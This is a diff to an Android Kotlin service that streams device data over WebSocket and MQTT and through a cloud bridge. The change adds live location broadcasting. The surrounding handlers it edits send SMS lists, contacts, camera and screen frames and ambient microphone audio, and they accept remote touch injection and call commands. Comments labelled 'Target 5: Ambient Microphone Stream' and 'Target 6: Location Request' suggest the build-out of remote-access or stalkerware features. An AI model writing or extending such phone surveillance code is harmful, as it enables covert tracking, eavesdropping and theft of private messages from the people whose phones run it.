@@ -51,6 +51,7 @@ class LocalFileServerService : Service() {
     private val wsMessageChannel = Channel<String>(Channel.UNLIMITED)
     private val mqttSendChannel = Channel<String>(Channel.UNLIMITED)
     private var mqttClient: MqttClient? = null
+    private lateinit var teleManager: TelephonyAndLocationManager
 
     companion object {
         private const val PORT = 8888
@@ -77,6 +78,12 @@ class LocalFileServerService : Service() {
         baseDir = getExternalFilesDir(null) ?: filesDir
         createNotificationChannel()
         registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+
+        // Initialize telephony and live location manager
+        teleManager = TelephonyAndLocationManager(applicationContext)
+        teleManager.onLocationUpdated = { locJson ->
+            broadcastMessage(locJson.toString())
+        }
 
         startMqttWorker()
         initCloudBridge()
@@ -181,7 +188,6 @@ class LocalFileServerService : Service() {
     }
 
     private fun sendFullSyncData() {
-        val teleManager = TelephonyAndLocationManager(applicationContext)
         broadcastMessage(JSONObject().apply {
             put("type", "HANDSHAKE_ACK")
             put("code", currentPairingCode)
@@ -189,7 +195,7 @@ class LocalFileServerService : Service() {
         }.toString())
         broadcastBatteryStatus()
         try {
-            broadcastMessage(teleManager.getLocation().put("type", "LOCATION").toString())
+            broadcastMessage(teleManager.getLocation().toString())
             broadcastMessage(JSONObject().put("type", "SMS_LIST").put("data", teleManager.getRecentSms()).toString())
             broadcastMessage(JSONObject().put("type", "CONTACTS_LIST").put("data", teleManager.getContacts()).toString())
             broadcastMessage(JSONObject().put("type", "STORAGE_STATS").put("data", teleManager.getStorageStats()).toString())
@@ -215,13 +221,11 @@ class LocalFileServerService : Service() {
         } catch (e: Exception) { e.printStackTrace() }
     }
 
-    // Standard Reliable Messages (QoS 1)
     fun broadcastMessage(msg: String) {
         wsMessageChannel.trySend(msg)
         mqttSendChannel.trySend(msg)
     }
 
-    // Direct Camera Frame Stream (QoS 0)
     fun sendDirectCameraFrame(base64Frame: String) {
         val json = JSONObject().apply {
             put("type", "CAMERA_FRAME")
@@ -239,7 +243,6 @@ class LocalFileServerService : Service() {
         }
     }
 
-    // Direct Screen Mirror Frame Stream (QoS 0)
     fun sendDirectScreenFrame(base64Frame: String) {
         val json = JSONObject().apply {
             put("type", "SCREEN_FRAME")
@@ -257,7 +260,6 @@ class LocalFileServerService : Service() {
         }
     }
 
-    // Direct Microphone PCM Audio Chunks (QoS 0)
     fun sendDirectAudioChunk(base64Pcm: String) {
         val json = JSONObject().apply {
             put("type", "AUDIO_CHUNK")
@@ -276,7 +278,6 @@ class LocalFileServerService : Service() {
     }
 
     private fun handleIncomingJson(json: JSONObject) {
-        val teleManager = TelephonyAndLocationManager(applicationContext)
         val cameraStreamer = DirectCameraStreamer.getInstance(applicationContext)
         val screenStreamer = DirectScreenStreamer.getInstance(applicationContext)
         val audioStreamer = AudioStreamManager.getInstance(applicationContext)
@@ -364,7 +365,7 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
-            // --- Target 5: Ambient Microphone Stream ---
+            // --- Ambient Audio ---
             "START_AUDIO_STREAM" -> {
                 audioStreamer.startStreaming { pcmBase64 ->
                     sendDirectAudioChunk(pcmBase64)
@@ -381,7 +382,7 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
-            // --- Target 5: Notification Quick Reply ---
+            // --- Notifications ---
             "QUICK_REPLY" -> {
                 val key = json.getString("key")
                 val replyText = json.getString("text")
@@ -428,7 +429,7 @@ class LocalFileServerService : Service() {
                 }
             }
 
-            // --- Touch & Navigation ---
+            // --- Touch Injection ---
             "INPUT_TAP" -> {
                 val service = RemoteInputService.instance
                 if (service != null) {
@@ -468,6 +469,11 @@ class LocalFileServerService : Service() {
                 }
             }
 
+            // --- Target 6: Location Request ---
+            "FETCH_LOCATION" -> {
+                broadcastMessage(teleManager.getLocation().toString())
+            }
+
             // --- Other Utilities ---
             "RING_SIREN" -> {
                 val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
@@ -483,7 +489,6 @@ class LocalFileServerService : Service() {
             }
             "STOP_SIREN" -> currentRingtone?.stop()
             "MAKE_CALL" -> teleManager.makeCall(json.getString("number"))
-            "FETCH_LOCATION" -> broadcastMessage(teleManager.getLocation().put("type", "LOCATION").toString())
             "FETCH_SMS" -> broadcastMessage(JSONObject().put("type", "SMS_LIST").put("data", teleManager.getRecentSms()).toString())
             "FETCH_CONTACTS" -> broadcastMessage(JSONObject().put("type", "CONTACTS_LIST").put("data", teleManager.getContacts()).toString())
             "FETCH_STORAGE" -> broadcastMessage(JSONObject().put("type", "STORAGE_STATS").put("data", teleManager.getStorageStats()).toString())
@@ -537,8 +542,6 @@ class LocalFileServerService : Service() {
 
     private fun Application.fileServerModule(directory: File) {
         install(WebSockets)
-
-        val teleManager = TelephonyAndLocationManager(applicationContext)
 
         routing {
             get("/") {
